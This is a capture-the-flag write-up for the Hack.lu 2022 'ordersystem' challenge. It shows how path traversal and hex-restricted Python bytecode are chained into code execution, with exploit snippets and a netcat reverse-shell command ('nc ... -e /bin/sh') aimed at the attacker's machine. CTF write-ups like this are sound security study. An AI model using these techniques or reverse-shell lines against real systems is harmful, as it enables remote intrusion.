### [Original
Writeup](https://enoflag.github.io/writeups/hacklu2022/ordersystem/)  
### [Challenge
Source](https://github.com/ENOFLAG/writeups/tree/master/hacklu2022/ordersystem/src)  
###
[Exploit](https://github.com/ENOFLAG/writeups/blob/master/hacklu2022/ordersystem/exploit.py)  
# HACK.LU 2022 - ordersystem

*30 Oct 2022, Writeup by [Timo Ludwig](https://github.com/timoludwig)*

| Category  | Pwn Pasta |  
| --------- | --------- |  
| Ordered   | 14 times  |  
| Calories  | 343       |  
| Chef      | tunn3l    |  
| Spicyness | ?️         |

> At our restaurant we like to deploy our own software. This time, we let our
> intern implement a digital ordering system. Can you test it for us? It has
> some very promising features already, though not all are shipped in this
> demo version.

## Challenge

Run the service locally:

```  
cd src  
docker build -t ordersystem . && docker run -p 4444:4444 --rm -it ordersystem  
```

The service exposes three commands at port `4444`:

1. `S`: Store key-value pairs in memory  
    - The keys have to be exactly 12 bytes long  
    - The values can only contain hex characters which are processed by `bytes.fromhex(data)`  
2. `D`: Dump the stored data to disk  
   - Save the in-memory entries into the `storage` directory  
   - The key is used as filename  
   - The value is used as file content  
3. `P`: Run plugin code on the data  
   - Run plugin by passing the filename in the `plugins` directory  
   - Interprete the plugin file as Python bytecode and call [exec()](https://docs.python.org/3.10/library/functions.html#exec)  
   - Make the in-memory data available as `co_consts` of the compiled [CodeType](https://docs.python.org/3.10/library/types.html#types.CodeType)

## First observations

So at the first glance, the exploit path looked pretty straight forward:

1. Create python bytecode to spawn a reverse shell  
2. Upload the bytecode via the `S` and `D` commands into the plugins directory by using a path traversal  
3. Run the bytecode via the `R` command  
4. profit

Unfortunately, there is a small caveat to it:  
The dump command encodes the values to hex before writing them to disk:  
```  
open(full,'w').write(content.hex())  
```  
So the e.g. the bytecode `\x64\x00` for [LOAD_CONST
0](https://docs.python.org/3.10/library/dis.html#opcode-LOAD_CONST) is
converted to `"6400"` which would be interpreted as the bytecode
`\x36\x34\x30\x30` from the plugin command (which directly segfaults,
obviously).

So in other words, we have to create a bytecode which can be represented by
printable hex characters, which dramatically limits our options:

```  
In [1]: import dis  
  ...: {  
  ...:     hex(op_code): op_name  
  ...:     for op_name, op_code in dis.opmap.items()  
  ...:     if chr(op_code) in "0123456789abcdef"  
  ...: }  
Out[1]:  
{'0x31': 'WITH_EXCEPT_START',  
'0x32': 'GET_AITER',  
'0x33': 'GET_ANEXT',  
'0x34': 'BEFORE_ASYNC_WITH',  
'0x36': 'END_ASYNC_FOR',  
'0x37': 'INPLACE_ADD',  
'0x38': 'INPLACE_SUBTRACT',  
'0x39': 'INPLACE_MULTIPLY',  
'0x61': 'STORE_GLOBAL',  
'0x62': 'DELETE_GLOBAL',  
'0x63': 'ROT_N',  
'0x64': 'LOAD_CONST',  
'0x65': 'LOAD_NAME',  
'0x66': 'BUILD_TUPLE'}  
```

## Writing exploit bytecode

At first, we were a bit disillusioned in view of our limited options, but then
we recognized a promising operation:

> `WITH_EXCEPT_START`: Calls the function in position 7 on the stack with the
> top three items on the stack as arguments. Used to implement the call
> `context_manager.__exit__(*exc_info())` when an exception has occurred in a
> [with](https://docs.python.org/3.10/reference/compound_stmts.html#with)
> statement.

– https://docs.python.org/3.10/library/dis.html#opcode-WITH_EXCEPT_START

Which means we have essentially found a
[CALL_FUNCTION](https://docs.python.org/3.10/library/dis.html#opcode-
CALL_FUNCTION) operation with a few restrictions. Fortunately, the challenge
authors gave us access to a debug function that is now very useful:

```  
def plugin_log(msg,filename='./log',raw=False):  
   mode = 'ab' if raw else 'a'

   with open(filename,mode) as logfile:  
       logfile.write(msg)  
```

And coincidently, this function exactly takes three arguments which can be
passed with `WITH_EXCEPT_START`.

Since all data entries are passed to the plugin code via `co_consts`, we can
reference them as arguments, as long as they're in the boundaries we can
access (meaning indexes `0x30`-`0x39` for `"0"`-`"9"` and `0x61`-`0x66` for
`"a"`-`"f"`).

This means we can use this function to pass our real (unrestricted) exploit
bytecode as keys of the storage and write these to another plugin file which
will be our final exploit plugin.

So we now can generate the bytecode that will call the function
`co_consts[func_index]` with the arguments `co_consts[content_index]` and
`co_consts[filename_index]`:

```  
def load_const(index=0x30):  
   return bytes([opmap["LOAD_CONST"], index])

def get_plugin_code(func_index, filename_index, content_index):  
   return (  
       # pos 7 on the stack is the plugin_log function  
       load_const(func_index)  
       # pos 4-6 are unused  
       # pos 3 contains the "raw" argument (must be non-zero)  
       + load_const() * 4  
       # pos 2 contains the "filename"  
       + load_const(filename_index)  
       # pos 1 contains the "msg"  
       + load_const(content_index)  
       # now trigger the "exception handler"  
       + bytes([[opmap["WITH_EXCEPT_START"], 0x30])  
   )  
```

## Solution

So to conclude, we can now:

0. Calculate proof of work to get the real target port  
1. Craft python bytecode which will spawn a reverse shell to the attacker's machine  
2. Divide this code into chunks of 12 bytes and store them as keys in the storage  
3. Upload and run one plugin for each chunk which appends the key to the logfile aka exploit plugin  
4. Run the exploit plugin

### Perform proof of work

When connecting to the service, we were greeted with a small PoW:

```  
nc 23.88.100.81 4444  
Welcome to our new Ordersystem. To spawn a new instance, please solve this
pow:  
challenge = 507a9bdca6d2c71c130b (decode this!)  
please send x in hex format so that md5(x+challenge) starts with 6 zeros. x
should be 10 bytes long :  
```

We didn't spend much time on the script which brute forces a response which
results in an md5 hash with 6 leading zeros when added to the given challenge.

### Reverse shell as Python bytecode

At first, we tried the inbuilt compiler to do the hard work for us:

```  
In [2]: plugin = compile("import os;os.system('nc 172.17.0.1 9001 -e
/bin/sh')", "", "exec")

In [3]: plugin.co_code  
Out[3]: b'd\x00d\x01l\x00Z\x00e\x00\xa0\x01d\x02\xa1\x01\x01\x00d\x01S\x00'  
```

Which results in the following operations:

```  
In [4]: import dis  
  ...: dis.disassemble(plugin)  
 1           0 LOAD_CONST               0 (0)  
             2 LOAD_CONST               1 (None)  
             4 IMPORT_NAME              0 (os)  
             6 STORE_NAME               0 (os)  
             8 LOAD_NAME                0 (os)  
            10 LOAD_METHOD              1 (system)  
            12 LOAD_CONST               2 ('nc 172.17.0.1 9001 -e /bin/sh')  
            14 CALL_METHOD              1  
            16 POP_TOP  
            18 LOAD_CONST               1 (None)  
            20 RETURN_VALUE  
```

But viewing the disassembled code highlighted a few problems:

1. We do not have access to the constants `0` and `None` (we can only create string constants by storing keys)  
2. The `nc` command is too long to fit into a single key

So we didn't get around crafting our own code:

```  
# This is the index where we will later store the nc command  
nc_index = ord("b")  
co_names = ["len", "list", "print", "os", "system", "decode"]

exploit_asm = [  
   # Get length of empty list to push 0 on the stack  
   ("BUILD_LIST", 0),  
   # Use NOP as arg to simplify compiler  
   ("GET_LEN", 0x09),  
   # Invoke print() to push None onto the stack  
   ("LOAD_NAME", co_names.index("print")),  
   ("CALL_FUNCTION", 0),  
   # Import os  
   ("IMPORT_NAME", co_names.index("os")),  
   # Invoke os.system()  
   ("LOAD_METHOD", co_names.index("system")),  
   # Decode first batch of nc command  
   ("LOAD_CONST", nc_index),  
   ("LOAD_METHOD", co_names.index("decode")),  
   ("CALL_METHOD", 0),  
   # Decode second batch of nc command  
   ("LOAD_CONST", nc_index + 1),  
   ("LOAD_METHOD", co_names.index("decode")),  
   ("CALL_METHOD", 0),  
   # Decode third batch of nc command  
   ("LOAD_CONST", nc_index + 2),  
   ("LOAD_METHOD", co_names.index("decode")),  
   ("CALL_METHOD", 0),  
   # Concatenate the three strings  
   ("BUILD_STRING", 3),  
   # Finaly invoke the nc command  
   ("CALL_METHOD", 1),  
]  
```

This performs the following:

1. Invoke `len(list())` to push `0` onto the stack  
2. Invoke `print()` to push `None` onto the stack  
5. Import `os`  
3. Load all three batches of the `nc` command  
4. Decode the command batches because `BUILD_STRING` only works with strings and not byte strings  
4. Concatenate the `nc` command  
6. Invoke the `nc` command via `os.system()`

Then, we can "compile" the code:

```  
exploit_bytecode = b""  
for op_name, arg in exploit_asm:  
   exploit_bytecode += bytes([opmap[op_name], arg])  
```

After that, we need to append the constants to make them available to the
plugin:

```  
exploit_bytecode += b";"  
exploit_bytecode += b";".join(n.encode() for n in co_names)  
```

### Upload exploit bytecode in chunks

Check how many chunks we need to store the exploit in:

```  
num_chunks = len(exploit_bytecode) // chunk_size + 1  
```

Pad the exploit code to a multiple of 12:

```  
exploit_bytecode = exploit_bytecode.ljust(chunk_size * num_chunks, b";")  
```

Upload exploit chunks:

```  
for i in range(0, len(exploit_bytecode), chunk_size):  
   upload_file(exploit_bytecode[i : i + chunk_size])  
```

### Upload plugins to assemble exploit chunks

```  
for i in range(num_chunks):  
   upload_plugin(  
       str(i), get_plugin_code(plugin_log_index, exploit_filename, base_index + i)  
   )  
```

### Upload additional constants

In order to make the exploit work, we need a few more constants.  
These have to be uploaded after the plugins to make sure the plugins can be
saved to disk successfully before any entries with invalid filenames are
created (e.g. saving the file `plugins/expl` won't work because there is no
directory `storage/plugins` but we cannot traverse the path because then the
logfile method won't find it since this is operating from the working
directory).

Store the filename which is used as "logfile" at index `ord("a")`

```  
upload_file("plugins/expl")  
```

Store the `nc` command at index `ord("b")`

```  
commmand = f"nc {ip} {rev_port} -e /bin/sh".ljust(chunk_size * 3, " ")  
upload_file(commmand[:chunk_size])  
upload_file(commmand[chunk_size : 2 * chunk_size])  
upload_file(commmand[2 * chunk_size :])  
```

### Run plugins to assemble exploit chunks

```  
for i in range(num_chunks):  
   run_plugin(str(i))  
```

### Run the exploit plugin

Now, we can listen for the reverse shell:

```  
reverse_shell = listen(rev_port)  
```

Run exploit code and spawn the reverse shell:

```  
run_plugin("expl")  
```

And finally get the flag  
```  
reverse_shell.sendline(b"echo $flag")  
flag = reverse_shell.readline()  
```

which rewards us with a reference I'm very [drawn
to](https://youtube.com/watch?v=hfM4xPyie78).

```  
flag{D1d_y0u_0rd3r_rc3?v=hfM4xPyie78}  
```  

Original writeup (https://enoflag.github.io/writeups/hacklu2022/ordersystem/).